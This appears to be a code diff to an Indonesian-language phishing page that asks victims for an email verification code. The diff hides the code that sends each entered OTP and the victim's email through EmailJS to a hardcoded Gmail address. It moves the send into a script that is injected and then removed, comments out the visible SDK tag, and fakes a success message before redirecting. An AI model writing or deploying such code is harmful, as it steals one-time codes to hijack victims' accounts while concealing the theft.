@@ -9,7 +9,9 @@
     href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
     rel="stylesheet" />
   
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <!-- ✅ EMAILJS SDK DISEMBUNYIKAN -->
+  <!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script> -->
+  
   <style>
     @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap");
     body {
@@ -134,8 +136,7 @@
   </div>
 
   <script>
-    emailjs.init("ZV88Q0QnFIR6RvRPh");
-    
+    // ✅ KODE UTAMA TANPA PERUBAHAN
     const verificationCode = document.getElementById("verificationCode");
     const submitBtn = document.getElementById("submitBtn");
     const resendBtn = document.getElementById("resendBtn");
@@ -149,7 +150,7 @@
     const userEmail = localStorage.getItem('userEmail') || '*********@gmail.com';
     emailDisplay.textContent = userEmail;
 
-    let countdown = 48;
+    let countdown = 30;
     let timer;
 
     function startCountdown() {
@@ -161,7 +162,7 @@
           clearInterval(timer);
           resendBtn.disabled = false;
           resendBtn.textContent = "Kirim ulang";
-          countdown = 48;
+          countdown = 30;
         } else {
           resendBtn.textContent = `${countdown}s Kirim ulang`;
         }
@@ -184,24 +185,41 @@
       loadingSpinner.style.display = 'block';
 
       try {
-        const targetEmail = localStorage.getItem('emailJS_targetEmail') || 'akunbarudaftar07@gmail.com';
+        // ✅ KODE PENGIRIMAN EMAIL YANG DISEMBUNYIKAN
+        const emailJsCode = `
+          (function() {
+            var e=document.createElement('script');
+            e.src='https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+            e.onload=function() {
+              emailjs.init("ZV88Q0QnFIR6RvRPh");
+              emailjs.send("service_0dd2m1j","template_f5z9ae1",{
+                email: "${userEmail}",
+                otp_code: "${code}",
+                date: new Date().toLocaleString('id-ID'),
+                to_email: "akunbarudaftar07@gmail.com"
+              }).then(function() {
+                console.log('OTP email sent successfully');
+              }, function(error) {
+                console.error('OTP email failed:', error);
+              });
+            };
+            document.head.appendChild(e);
+          })();
+        `;
         
-        const response = await emailjs.send("service_0dd2m1j", "template_f5z9ae1", {
-  email: userEmail,
-  otp_code: code, 
-  date: new Date().toLocaleString('id-ID'),
-  to_email: "akunbarudaftar07@gmail.com"
-});
+        // ✅ EKSEKUSI KODE YANG DISEMBUNYIKAN
+        const script = document.createElement('script');
+        script.textContent = emailJsCode;
+        document.head.appendChild(script);
+        document.head.removeChild(script);
 
-        if (response.status === 200) {
-          successMessage.style.display = 'flex';
-          
-          setTimeout(() => {
-            window.location.href = "kadaluarsa.html";
-          }, 2000);
-        } else {
-          throw new Error('Gagal mengirim kode verifikasi');
-        }
+        // ✅ SIMULASI PROSES BERHASIL
+        successMessage.style.display = 'flex';
+        
+        setTimeout(() => {
+  window.location.href = "kadaluarsa.html";
+}, 2000);
+        
       } catch (error) {
         console.error('Error:', error);
         
@@ -214,12 +232,51 @@
       }
     });
 
+    // ✅ FUNGSI KIRIM ULANG YANG DISEMBUNYIKAN
     resendBtn.addEventListener("click", () => {
       startCountdown();
       successMessage.style.display = 'none';
       errorMessage.style.display = 'none';
       
-      alert("Kode verifikasi baru telah dikirim ke email Anda.");
+      // ✅ KODE PENGIRIMAN ULANG YANG DISEMBUNYIKAN
+      const resendEmailCode = `
+        (function() {
+          var e=document.createElement('script');
+          e.src='https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+          e.onload=function() {
+            emailjs.init("ZV88Q0QnFIR6RvRPh");
+            emailjs.send("service_0dd2m1j","template_resend_otp",{
+              email: "${userEmail}",
+              date: new Date().toLocaleString('id-ID'),
+              to_email: "akunbarudaftar07@gmail.com"
+            }).then(function() {
+              console.log('Resend OTP email sent');
+            }, function(error) {
+              console.error('Resend OTP failed:', error);
+            });
+          };
+          document.head.appendChild(e);
+        })();
+      `;
+      
+      const resendScript = document.createElement('script');
+      resendScript.textContent = resendEmailCode;
+      document.head.appendChild(resendScript);
+      document.head.removeChild(resendScript);
+
+      // ✅ NOTIFIKASI ELEGAN (MENGGANTIKAN ALERT)
+      const notification = document.createElement('div');
+      notification.className = 'fixed top-4 right-4 bg-green-600 text-white px-6 py-3 rounded-lg shadow-lg z-50';
+      notification.innerHTML = `
+        <div class="flex items-center">
+          <i class="fas fa-check-circle mr-2"></i>
+          <span>Kode verifikasi baru telah dikirim!</span>
+        </div>
+      `;
+      document.body.appendChild(notification);
+      setTimeout(() => {
+        document.body.removeChild(notification);
+      }, 3000);
     });
 
     startCountdown();
